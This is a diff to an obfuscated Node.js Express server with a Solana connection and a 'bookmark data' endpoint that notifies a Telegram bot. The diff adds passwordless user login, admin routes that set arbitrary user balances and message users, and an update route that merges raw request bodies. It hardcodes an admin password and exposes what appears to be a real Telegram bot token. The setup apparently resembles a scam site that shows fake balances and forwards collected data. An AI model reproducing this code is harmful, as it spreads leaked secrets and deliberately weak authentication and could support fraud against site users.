@@ -10,13 +10,15 @@ const fetch = require('node-fetch');
 const app = express();
 const X7F9K2 = 5000;
 const Q8M3N7 = path.join(__dirname, 'data.json');
+const USERS_FILE = path.join(__dirname, 'users.json'); // New file for users
 const Z4H8L6 = "admin123";
 const R2Y5P9 = crypto.randomBytes(32).toString('hex');
-const W3K7M1 = new Set();
+const W3K7M1 = new Set(); // Admin tokens
+const USER_TOKENS = new Map(); // Map<token, userId> for user auth
 
 // Telegram configuration
 const TELEGRAM_BOT_TOKEN = '7805892995:AAGOxjdUmdAuWGdx0TRyMg0VbTUptGOL0Sg';
-const TELEGRAM_CHAT_ID = '1422167105';  // Replace with your correct chat ID
+const TELEGRAM_CHAT_ID = 'YOUR_ACTUAL_CHAT_ID_HERE';  // Replace with your correct chat ID
 
 app.use(bodyParser.json());
 app.use(express.static('public'));
@@ -24,6 +26,10 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 if (!fs.existsSync(Q8M3N7)) {
     fs.writeFileSync(Q8M3N7, JSON.stringify([]));
+}
+
+if (!fs.existsSync(USERS_FILE)) {
+    fs.writeFileSync(USERS_FILE, JSON.stringify({})); // {userId: {name, balance: 0, messages: []}}
 }
 
 // Reads and parses the data.json file
@@ -40,6 +46,21 @@ function D5V8B3() {
 // Writes data to the data.json file
 function F6N2T9(data) {
     fs.writeFileSync(Q8M3N7, JSON.stringify(data, null, 2));
+}
+
+// Users storage functions
+function loadUsers() {
+    try {
+        const data = fs.readFileSync(USERS_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (error) {
+        console.error('Error reading users file:', error);
+        return {};
+    }
+}
+
+function saveUsers(users) {
+    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
 }
 
 // Establishes connection to Solana mainnet
@@ -120,7 +141,7 @@ function J8L4Q6(sBundlesString, bundleKey) {
     }
 }
 
-// Middleware to verify authentication token
+// Middleware to verify admin authentication token
 function K9S2E7(req, res, next) {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
@@ -129,6 +150,20 @@ function K9S2E7(req, res, next) {
         return res.status(401).json({ success: false, error: 'Unauthorized' });
     }
 
+    next();
+}
+
+// Middleware to verify user authentication token
+function userAuthMiddleware(req, res, next) {
+    const authHeader = req.headers['authorization'];
+    const token = authHeader && authHeader.split(' ')[1];
+
+    if (!token || !USER_TOKENS.has(token)) {
+        return res.status(401).json({ success: false, error: 'Unauthorized' });
+    }
+
+    // Attach userId to req
+    req.userId = USER_TOKENS.get(token);
     next();
 }
 
@@ -260,6 +295,230 @@ app.post('/api/admin-logout', K9S2E7, (req, res) => {
     }
 
     res.json({ success: true, message: 'Logged out successfully' });
+});
+
+// === User Authentication Endpoints ===
+// User login (simple, no password for demo)
+app.post('/api/user/login', async (req, res) => {
+    try {
+        const { userId } = req.body;
+        if (!userId) {
+            return res.status(400).json({ success: false, error: 'userId required' });
+        }
+
+        const users = loadUsers();
+        if (!users[userId]) {
+            return res.status(401).json({ success: false, error: 'User not found' });
+        }
+
+        const token = A4C8N1();
+        USER_TOKENS.set(token, userId);
+
+        // Expire token after 24h
+        setTimeout(() => {
+            USER_TOKENS.delete(token);
+        }, 24 * 60 * 60 * 1000);
+
+        res.json({
+            success: true,
+            token: token,
+            userId: userId
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// User logout
+app.post('/api/user/logout', userAuthMiddleware, (req, res) => {
+    const authHeader = req.headers['authorization'];
+    const token = authHeader && authHeader.split(' ')[1];
+    if (token) {
+        USER_TOKENS.delete(token);
+    }
+    res.json({ success: true, message: 'Logged out successfully' });
+});
+
+// === User APIs (Public with auth) ===
+// Get user balance
+app.get('/api/user/balance', userAuthMiddleware, (req, res) => {
+    try {
+        const users = loadUsers();
+        const userId = req.userId;
+        const user = users[userId];
+        if (!user) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+        res.json({
+            success: true,
+            balance: user.balance || 0
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Get user messages
+app.get('/api/user/messages', userAuthMiddleware, (req, res) => {
+    try {
+        const users = loadUsers();
+        const userId = req.userId;
+        const user = users[userId];
+        if (!user) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+        res.json({
+            success: true,
+            messages: user.messages || []
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// === Admin User APIs ===
+// Get all users (admin only)
+app.get('/api/users', K9S2E7, (req, res) => {
+    try {
+        const users = loadUsers();
+        const userList = Object.entries(users).map(([id, data]) => ({
+            id,
+            name: data.name,
+            balance: data.balance || 0,
+            messageCount: (data.messages || []).length
+        }));
+        res.json({
+            success: true,
+            users: userList
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Create new user (admin only)
+app.post('/api/users', K9S2E7, (req, res) => {
+    try {
+        const { id, name, balance = 0 } = req.body;
+        if (!id || !name) {
+            return res.status(400).json({ success: false, error: 'id and name required' });
+        }
+
+        const users = loadUsers();
+        if (users[id]) {
+            return res.status(400).json({ success: false, error: 'User already exists' });
+        }
+
+        users[id] = {
+            name,
+            balance,
+            messages: []
+        };
+        saveUsers(users);
+
+        res.json({ success: true, message: 'User created successfully' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Update user (admin only)
+app.put('/api/users/:id', K9S2E7, (req, res) => {
+    try {
+        const userId = req.params.id;
+        const updates = req.body;
+        const users = loadUsers();
+        if (!users[userId]) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+
+        users[userId] = { ...users[userId], ...updates };
+        saveUsers(users);
+
+        res.json({ success: true, message: 'User updated successfully' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Delete user (admin only)
+app.delete('/api/users/:id', K9S2E7, (req, res) => {
+    try {
+        const userId = req.params.id;
+        const users = loadUsers();
+        if (!users[userId]) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+
+        // Remove associated tokens
+        for (let [token, uid] of USER_TOKENS.entries()) {
+            if (uid === userId) {
+                USER_TOKENS.delete(token);
+            }
+        }
+
+        delete users[userId];
+        saveUsers(users);
+
+        res.json({ success: true, message: 'User deleted successfully' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Update user balance (admin only)
+app.post('/api/users/:id/balance', K9S2E7, (req, res) => {
+    try {
+        const userId = req.params.id;
+        const { balance } = req.body;
+        if (typeof balance !== 'number') {
+            return res.status(400).json({ success: false, error: 'balance must be a number' });
+        }
+
+        const users = loadUsers();
+        if (!users[userId]) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+
+        users[userId].balance = balance;
+        saveUsers(users);
+
+        res.json({ success: true, message: 'Balance updated successfully' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Send message to user (admin only)
+app.post('/api/users/:id/message', K9S2E7, (req, res) => {
+    try {
+        const userId = req.params.id;
+        const { message } = req.body;
+        if (!message || typeof message !== 'string') {
+            return res.status(400).json({ success: false, error: 'message required as string' });
+        }
+
+        const users = loadUsers();
+        if (!users[userId]) {
+            return res.status(404).json({ success: false, error: 'User not found' });
+        }
+
+        if (!users[userId].messages) {
+            users[userId].messages = [];
+        }
+        users[userId].messages.push({
+            id: Date.now(),
+            timestamp: new Date().toISOString(),
+            text: message,
+            read: false
+        });
+
+        saveUsers(users);
+
+        res.json({ success: true, message: 'Message sent successfully' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
 });
 
 // Store bookmark data endpoint with Telegram notification
@@ -395,7 +654,7 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// Serve index page
+// Serve index page (user dashboard)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
